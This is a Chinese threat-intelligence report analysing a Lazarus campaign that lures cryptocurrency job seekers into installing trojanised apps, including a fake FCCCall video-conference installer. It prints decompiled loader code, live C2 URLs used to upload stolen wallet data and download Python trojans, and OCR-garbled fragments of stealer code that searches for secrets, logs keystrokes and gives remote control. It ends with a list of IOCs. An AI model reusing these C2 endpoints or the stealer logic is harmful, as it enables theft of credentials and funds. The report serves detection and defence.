@@ -1,0 +1,251 @@
+# Lazarus窃密币动作活跃，大量资产仍存活  
+
+原创微步情报局微步在线研究响应中心2024年10月15日12:31北京  
+
+  
+
+## 概述  
+
+Lazarus是具有国家背景的东北亚APT组织，至少自2009 年以来一直活跃。Lazarus攻击目标广泛，当前已发展为包含多个分支机构的复杂黑客团伙。区别于其他APT组织，Lazarus最常见的攻击活动目的为敛财。近十年间，Lazarus对加密货币领域一直保持高度兴趣。微步情报局发现，自Lazarus使用Python存储库PyPl投毒事件以来，Lazarus对于轻量级的python、Javascript武器库愈发青睐。虽然相关攻击事件已经多次被披露，但很多攻击资产依然大量存活。在朝鲜半岛区域政治局势更加紧张的当下，不排除Lazarus在今后更为活跃的可能性。  
+
+■Lazarus组织通过在社交平台发布密币相关的虚假招聘广告或相关项目引诱目标人员，目标人员上钩后，进一步引诱目标人员安装视频面试相关的带毒工具或带毒的密币项目，以此展开密币窃取活动。  
+■Lazarus组织该系列对加密货币领域的活动最早可追溯到2023年5月份，使用的武器库木马包括QT6平台开发的下载器，Python、Javascript木马，目标操作系统包括Windows、Linux、MacOS。  
+■微步通过对相关样本、IP和域名的溯源分析，提取多条相关IOC，可用于威胁情报检测。微步威胁感知平台TDP、威胁情报管理平台 TIP、威胁情报云 APl、云沙箱 S、沙箱分析平台 OneSandbox、互联网安全接入服务 OneDNS、威胁防御系统 OneSIG、终端安全管理平台OneSEC等均已支持对此次攻击事件的检测与防护。  
+
+## 2 事件详情  
+
+-azarus组织在Linkedln、X(Twitter)、Facebook、GitHub、Stack Overflow等多个平台发布加密货币相关的招聘或研究项目，以比物色目标人员。其中伪造的密币相关雇主网站Hirog.io当前依然存活。  
+
+  
+
+Google快照可见多个历史招聘信息。  
+
+  
+Lazarus窃密币动作活跃，大量资产仍存活  
+
+目标人员"上钩"后，攻击者通过telegram等通讯平台进一步引诱目标人员下载安装带毒的程序。基于Node.js的投毒MERN密币项目如下。  
+
+  
+
+  
+
+  
+
+伪造的FCCCall视频会议软件如下，存在Windows和MacOS版本。  
+
+  
+
+目标人员安装带毒的项目之后，后台恶意代码机会下载安装后阶载荷展开窃密活动。  
+
+Lazarus诱导目标人员安装的带毒项目覆盖Windows、Linux、MacOs平台，后续使用的载荷多为轻量级的同类型python窃密木马,本文以Windows平台下"伪造FCCCall视频会议安装包的样本"为例进行分析。  
+
+<html><body><table><tr><td>文件名</td><td>FCCCall.msi</td></tr><tr><td>MD5</td><td>8ebca0b7ef7dbfc14da3ee39f478e880</td></tr><tr><td>SHA1</td><td>5cce14436b3ae5315feec2e12ce6121186f597b3</td></tr><tr><td>SHA256</td><td>36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a0867 0</td></tr><tr><td>文件类型</td><td>MSI</td></tr><tr><td>文件大小</td><td>152.37MB</td></tr><tr><td>描述</td><td>伪造的FCCCall视频会议安装包，密币窃取。</td></tr></table></body></html>  
+
+1.FCCCallMSI安装包如下，启动程序FCCCall.exe即初始窃密木马。  
+
+<html><body><table><tr><td></td><td>C:\Users\TB\Desktop\FCCCall.msi\</td><td></td><td></td><td></td><td></td></tr><tr><td>名称</td><td></td><td>大小</td><td>压缩后大小创建时间</td><td></td><td>修改时间</td></tr><tr><td></td><td>Binary.banner.scale20...</td><td>22 946</td><td>23 040</td><td></td><td></td></tr><tr><td></td><td>Binary.banner.svg</td><td>28 870</td><td>29 184</td><td></td><td></td></tr><tr><td></td><td>Binary.cmdlinkarrow</td><td>2 862</td><td>2880</td><td></td><td></td></tr><tr><td></td><td>Binary.completi</td><td>15086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.custicon</td><td>15086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.dialogjpg</td><td>12 626</td><td>12800</td><td></td><td></td></tr><tr><td></td><td>Binary.dialog.scale12..</td><td>16673</td><td>16 896</td><td></td><td></td></tr><tr><td></td><td>Binary.dialog.scale15..</td><td>27 770</td><td>28 160</td><td></td><td></td></tr><tr><td>E</td><td>Binary.dialog.scale20...</td><td>69 692</td><td>70144</td><td></td><td></td></tr><tr><td></td><td>Binary.dialog.svg</td><td>33 179</td><td>33 280</td><td></td><td></td></tr><tr><td></td><td>Binary.exclamic</td><td>15 086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.info</td><td>15086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.insticon</td><td>15086</td><td>15360</td><td></td><td></td></tr><tr><td></td><td>Binary.New</td><td>15086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.removico</td><td>15 086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.repairic</td><td>15086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>Binary.tabback</td><td>854</td><td>896</td><td></td><td></td></tr><tr><td></td><td>Binary.Up</td><td>15 086</td><td>15 360</td><td></td><td></td></tr><tr><td></td><td>disk1.cab</td><td>156 965 590</td><td>156 965 888</td><td></td><td></td></tr><tr><td></td><td>lcon.FCCCall.exe</td><td>113 543</td><td>113 664</td><td></td><td></td></tr><tr><td></td><td>[5]Summarylnformat.</td><td>548</td><td>576</td><td></td><td></td></tr><tr><td>选定1/62个项目</td><td></td><td>156 965 590</td><td>156 965 590</td><td></td><td></td></tr></table></body></html>  
+
+2．木马采用QT6环境开发，通过指向freeconference.com的视频会议窗口掩盖后台恶意代码执行。  
+
+56 Qobject::connectImpl(&v17,v22,&v37,v22,&v36,v3,0,0i64,&unk_1400162D0);   
+57 QMetaObject::Connection::\~Connection((QMetaobject::Connection $\yen123,456$   
+58 QWebEngineView::QWebEngineView((QwebEngineView \*)v21, 0i64);   
+59 V36 $=$ (QWebEnginePage \*)operator new(0x18ui64);   
+60 v4= sub_140007BE0(v36, 0i64);   
+61 QWebEngineView::setPage((QwebEngineView \*)v21,v4);   
+62 QString::QString((Qstring $^{*})\vee16.$ "https://hello.freeconference.com/login/access-code");   
+63 $v5=$ （const struct Qur1\*)Qurl::Qur1（&v36,v16,0i64）;   
+64 QWebEngineView::load((QwebEngineView \*)v21,v5);   
+65 QUr1::\~QUr1((Qur1 \*)&v36);   
+66 QString::\~QString(v16);   
+67 QWidget::resize((QWidget \*)v21,1024,750);   
+68 QWidget::show((QWidget \*)v21);   
+69 v6=（QWebEnginePage \*)operator new(0x28ui64);   
+70 v36=v6;   
+71 QMenu::QMenu(v6, 0i64);   
+72 \*（_QWORD \*)v6=&QMenu::vftable';   
+73 \*(（_QWORD \*)v6+2)=&QMenu::vftable';   
+74 QString::QString（（QString \*)v18,"&Hide");   
+75 v7=QWidget::addAction（v6,（const struct QString\*)v18);   
+76 QString::\~QString（v18);   
+77 \*（_QWORD \*)&v16[0]=QWidget::hide;   
+78 DWORD2(v16[0])=0;   
+79 v17=v16[0];   
+80 v36=(QWebEnginePage \*)QAction::triggered;   
+81 v8= operator new(0x20ui64);   
+82 \*(_QWORD \*)&v16[0] =v8;   
+83 \*（_DWORD \*)v8=1;   
+84 v8[1]=sub_1400015A0;  
+
+3.恶意代码初始化，C2（http://185.235.241.208:1224）、浏览器密币钱包扩展程序ID。  
+
+  
+
+1.根据默认的密币钱包扩展程序数据存储路径，窃取数据回传，URL：http://185.235.241.208:1224/upload  
+
+  
+
+5．此外，木马进行python环境下载、python client木马下载。  
+
+http://185.235.241.208:1224/pdown $->$ python安装包;  
+http://185.235.241.208:1224/client/99 -> python木马。  
+
+  
+
+6. http://185.235.241.208:1224/client/99 $->$ main99.py，下载的python载荷使用lambda函数进行多层嵌套的倒序、base64解码、解压缩处理得到最终python代码实体。  
+
+  
+00006D09 core_sub_140007810:58 (140007909)  
+
+7.main99.py实际为下载器木马，下载三个后阶python木马分别实现远控、窃密、按键及窗口监控等恶意功能。  
+
+  
+
+8．简要总结三个下载的python木马功能如下。  
+
+<html><body><table><tr><td>URL</td><td>落地路径</td><td>描述</td></tr><tr><td>http://185.235.241.208:1224/payl oad/99/root</td><td>%userprofile%/.n2/pay</td><td>主机侦察、文件窃密、用户监 控、shell，配置anydesk无 人值守</td></tr><tr><td>http://185.235.241.208:1224/bro w/99/r0ot</td><td>%userprofile%/.n2/bow</td><td>针对主流的浏览器窃密</td></tr><tr><td>http://185.235.241.208:1224/mcli p/99/root</td><td>%userprofile%/.n2/mlip</td><td>窗口监控、剪切板监控、按键 记录</td></tr></table></body></html>  
+
+%userprofile%/.n2/pay主机侦察代码如下，攻击者侦察重点为加密货币相关。  
+
+# Lazarus窃密币动作活跃，大量资产仍存活  
+
+# #过滤文件扩展名  
+
+ex_files =['.exe' . d11" .ms1',.cimg','.1so alDK XaPK .aar aab" '.dex','.clas! #过滤文件目录  
+
+ex_dirs ['vendor 'Pods','node_modules git .next externalNativeBuild' 'sdk','.idea' cocos2d" pat_envs =['.env 'config.js', secret 'metamask' 'wallet private 'mnemonic ,'password','account', ex1_files = ['.php','.svg','.htm' -hpp .cpp' . XmI -png' .Swit ccb .tsx','.h','.java' ex2_files =['tsconfig.json','tailwind.config.js','svelte.config.js 'next.config.js','babel.config.js',  
+
+def1d（rd，pd）：#遍历文件  
+
+def fmt_s(s): if s<1024:return str(s)+'B elif s<1048576:return'{:.0f}KB'.format(s/1024.) elif s<1073741824:return'(:.1f)MB'.format(s/1048576.) else:return'(:.1f)GB'.format(s/1073741824.)  
+
+defups（sn）：#文件上传lef auto_up():fpatten('\*private\*')fpatten('\*mnemonic\*fpatten('\*secret\*')fpatten('\*wallet\*1)fenv()  
+
+<html><body><table><tr><td>Hdeffpatten（pat）：#具标文件模糊搜索上传</td></tr><tr><td>def uenv（C）:shellc</td></tr><tr><td></td></tr><tr><td>deffenv（）：#模糊搜素包含".eny"路径文件上传</td></tr></table></body></html>  
+
+使用下发的配置文件启用anydesk客户端对中马主机进行更为直接的远控。  
+
+  
+
+使用多个python库用于窗口监控、进程监控、剪切板监控、按键记录。  
+
+import socket, subprocess, sys, re   
+try:importpyWinhook aspyHook   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'pyWinhook\']);import pyWinhook as pyHook   
+try:import psutil   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'psutil\']);import psutil   
+try:import win32process   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'pywin32\']);import win32process   
+try:import win32gui   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'pywin32\']);import win32gui   
+try:import win32api   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'pywin32\']);import win32api   
+try:import win32con   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'pywin32\']);import win32con   
+try:import win32clipboard   
+except:subprocess.check_call([sys.executable, _M,_P,_L,\'pywin32\']);import win32clipboard   
+try:fromrequestsimportpost   
+except:subprocess.check_call([sys.executable, _M,_P,_L,\'requests\']);from requests import post   
+try:import wx   
+except:subprocess.check_call([sys.executable,_M,_P,_L,\'wxPython\']);import wx  
+
+Python窃密木马适配Windows、Linux、MaxOS三大PC平台。  
+
+  
+
+标浏览器包括chrome、opera、brave、yandex、msedge五个常见浏览器程序.  
+
+class Chrome(BrowserVersion） :base_name -"chrome";v_w -["chrome","chrome dev", "chrome beta", "chrome canary"]iv_1 -["gooale-chrome",   
+"google-chrome-unstable"，"αoagle-chrome-beta"];v_m =["chrome"，"chrome dex","chrome beta","chrome canary"]   
+class Brave(Browserversion) :base_name -"brave";v_w- ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"];v_1 -["Brave-Browser", "Brave-Browser-Beta","Brave-Browser-Nightly"];v_m =["Brave-Browser","Brave-Browser-Beta","Brave-Browser-Nightly"]   
+class Opera(BrowserVersion) :base_name -"opera";v_w - ["opera Stable", "opera Next", "opera Developer"];v_l - ["opera","opera-beta", "opera-developer"]; V_m -["som-anarasoftwaxe.Opera","som-operasoftwara.OperaNext", "som-anerasaftwaxe.operaDeveloper"]   
+class Yandex(BrowserVersion) :base_name - "yandex";v_w - ["YandexBrowser"];v_1 - ["YandexBrowser"] ;v_m - ["YandexBrowser"]   
+class MsEdge (BrowserVersion) :base_name = "msedge";v_w = ["Edge"];v_1 - [] ;v_m = []  
+
+9.核心的远控代码初始化如下，解析各类型指令功能如下表。  
+
+asssneil(opject): def_init_(A,s) : A.sess =S;A.is_alive =_T;A.is_delete=_F;A.lock=RLock();A.timeout_count=0;A.cp_stop=0 A.par_dir=os.path.join(os.path.expanduser("\~"),".n2") A.cmds - (1:A.ssh_obj,2:A.ssh_cmd,3:A.ssh_clip,4:A.ssh_run,5:A.ssh_upload,6:A.ssh_ki1l,7:A.ssh_any,8:A.ssh_env) print("initsuccess")  
+
+<html><body><table><tr><td>Index</td><td>代码符号</td><td>功能描述</td></tr><tr><td>1</td><td>ssh_obj</td><td>执行shell</td></tr><tr><td>2</td><td>ssh_cmd</td><td>结束python进程</td></tr><tr><td></td><td>ssh_clip</td><td>剪切板数据监控</td></tr><tr><td>4</td><td>ssh_run</td><td>执行bow浏览器窃密木马</td></tr><tr><td>5</td><td>ssh_upload</td><td>指定文件上传</td></tr><tr><td>6</td><td>ssh_kill</td><td>结束目标浏览器进程</td></tr><tr><td>7</td><td>ssh_any</td><td>启用anydesk远控</td></tr><tr><td>8</td><td>ssh_env</td><td>匹配*.env命名的主机文件，目标侦察</td></tr></table></body></html>  
+
+## 附录-10C  
+
+135.181.242.24   
+140.99.223.36   
+144.172.74.108   
+144.172.74.48   
+14/.124.215.11   
+147.124.213.17   
+147.124.213.29   
+147.124.214.129   
+147.124.214.131   
+147.124.214.237   
+166.88.132.39   
+167.88.164.29   
+167.88.168.152   
+167.88.168.24   
+172.86.100.168   
+172.86.123.35   
+172.86.97.80   
+172.86.98.240   
+173.211.106.101   
+185.235.241.208   
+23.106.253.194   
+23.106.253.209   
+23.106.253.215   
+23.106.70.154   
+23.254.244.242   
+45.140.147.208   
+45.61.129.255   
+45.61.130.0   
+45.61.131.218   
+45.61.158.54   
+45.61.158.7   
+45.61.160.14   
+45.61.169.187   
+45.61.169.99   
+45.89.53.59   
+46.4.224.205   
+67.203.0.152   
+67.203.123.171   
+67.203.6.171   
+67.203.7.163   
+67.203.7.171   
+67.203.7.245   
+77.37.37.81   
+91.92.120.135   
+95.164.17.24   
+blocktestingto.com   
+de.ztec.store   
+hirog.io   
+freeconference.io   
+ipcheck.cloud   
+mirotalk.net   
+regioncheck.net   
+b8e69d6a766b9088d650e850a638d7ab7c9f59f4e24e2bc8eac41c380876b0d8   
+36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670   
+6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0   
+f474c840501076b1aceba06e1376cee142a7ff1fa642822f7592c92ae70578c2   
+6156127355d8016c8e741de98ee4ef2a4cb5cb02cd44f22fd3c8fef033b69830   
+5b70972c72bf8af098350f8a53ec830ddbd5c2c7809c71649c93f32a8a3f1371   
+6465f7ddc9cf8ab6714cbbd49e1fd472e19818a0babbaf3764e96552e179c9af   
+9abf6b93eafb797a3556bea1fe8a3b7311d2864d5a9a3687fce84bc1ec4a428c   
+7f1f51d216e621ed4fd9f5346044685a0e04c6a7fdd2c177f5d6233a67e2fd4e   
+000b4a77b1905cabdb59d2b576f6da1b2ef5a0258004e4a9e290e9f41fb6923   
+fca6351f0a913e3ca9df5cb0e0d5c0a05bcf580bcc57c4e858ee5378969430cd   
+dfb8c0525681d6fa8f65bbd62293c619a778f4080ebe29e41fe31b4f122000cf   
+94076a58c29d7e7f8b5f61739ab85ada09e41cd9212bc610b89e0fde30d5de70   
+bbad95905eb7a2b62685da98ba46aa3f19cb8a340ea71e5f85ee5b5a57aa27cb   
+247b10932d52c9a66ef073b7bc4461828081ffe07e06f6f20e4e32895acb61ba   
+6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0   
+6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0   
+6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0   
+8a23dd86da0aff9b460b8ebc9dd3e891d44ea0183ace4f5d28a7e4ddab47664a   
+0621d37818c35e2557fdd8a729e50ea662ba518df8ca61a44cc3add5c6deb3cd   
+a87b6664b718a9985267f9670e10339372419b320aa3d3da350f9f71dff35dd1   
+04cc30ea566af31abc2fdced5f9503aab30550373124d47985fbab19ace2caa8   
+9ece783ac52c9ec2f6bdfa669763a7ed1bbb24af1e04e029a0a91954582690cf   
+5f002c34ff4549dc73e648f0f6b487e01ef695684ffc00fb6c85914a97afdb4   
+b5aa25da526121df9c520b622bfde5272fb686b3e12ae33e069eeb8b346ab7fd   
+c73e3fdfeb574497c70e4a73a3dabe02ca74bc7beba3f4b9bf10f44968d20ccb   
+5209782555a10ee0a301faf1eff698291aea0e0b298e3926eebd37dc9b5d1a46  
